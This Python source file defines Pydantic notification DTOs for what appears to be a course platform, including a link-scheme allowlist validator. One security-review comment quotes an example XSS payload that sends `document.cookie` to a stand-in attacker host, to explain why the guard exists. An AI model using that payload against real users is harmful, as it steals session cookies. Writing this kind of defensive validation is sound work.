"""Notification DTOs (Sprint 4)."""

import uuid
from datetime import datetime

from pydantic import BaseModel, Field, field_validator


# HIGH-1 (sprint-4 security review): block dangerous URL schemes at the
# DTO boundary. Without this guard, an admin could embed
# `javascript:fetch('https://attacker/?'+document.cookie)` and any
# learner who clicks the bell-icon item triggers SPA-origin script
# execution. The frontend re-validates as defence in depth
# (NotificationCenter.vue#safeLinkHref) so a future schema regression
# cannot bypass the click-time check.
_ALLOWED_LINK_PREFIXES = ("https://", "http://", "/")


def _validate_link(v: str | None) -> str | None:
    if v is None or v == "":
        return None
    if not any(v.startswith(p) for p in _ALLOWED_LINK_PREFIXES):
        raise ValueError(
            "link must be a relative path (/...) or an http/https URL"
        )
    return v


class NotificationCreate(BaseModel):
    recipient_user_id: uuid.UUID
    title: str = Field(min_length=1, max_length=200)
    body: str = Field(min_length=1, max_length=2000)
    link: str | None = Field(default=None, max_length=500)

    @field_validator("link")
    @classmethod
    def link_scheme_allowlist(cls, v: str | None) -> str | None:
        return _validate_link(v)


class BroadcastNotificationCreate(BaseModel):
    """Course-scoped broadcast to all active non-admin enrollments."""

    course_slug: str = Field(min_length=1, max_length=64)
    title: str = Field(min_length=1, max_length=200)
    body: str = Field(min_length=1, max_length=2000)
    link: str | None = Field(default=None, max_length=500)

    @field_validator("link")
    @classmethod
    def link_scheme_allowlist(cls, v: str | None) -> str | None:
        return _validate_link(v)


class BroadcastNotificationOut(BaseModel):
    course_slug: str
    sent_count: int
    skipped_inbox_full: int
    skipped_admin: int


class BroadcastScheduleCreate(BroadcastNotificationCreate):
    """Schedule a course broadcast for a future time (UTC or offset-aware)."""

    scheduled_at: datetime


class ScheduledBroadcastOut(BaseModel):
    id: uuid.UUID
    course_slug: str
    title: str
    body: str
    link: str | None
    scheduled_at: datetime
    status: str
    sent_at: datetime | None = None
    sent_count: int | None = None
    skipped_inbox_full: int | None = None
    skipped_admin: int | None = None
    failure_reason: str | None = None
    created_at: datetime

    model_config = {"from_attributes": True}


class ScheduledBroadcastListOut(BaseModel):
    items: list[ScheduledBroadcastOut]


class ScheduledBroadcastCancelOut(BaseModel):
    id: uuid.UUID
    status: str


class NotificationOut(BaseModel):
    """A single notification with the sender's display name denormalised
    so the client never needs a second request to render."""

    id: uuid.UUID
    recipient_user_id: uuid.UUID
    sender_user_id: uuid.UUID
    sender_name: str
    title: str
    body: str
    link: str | None
    course_id: uuid.UUID | None = None
    read_at: datetime | None
    created_at: datetime


class NotificationListOut(BaseModel):
    """`items` is capped at `settings.notification_poll_limit` so each
    30 s poll stays cheap. `unread_count` is the true total of unread
    rows — clients use it to render the bell badge accurately even
    when the inbox is deeper than the list cap."""

    items: list[NotificationOut]
    unread_count: int
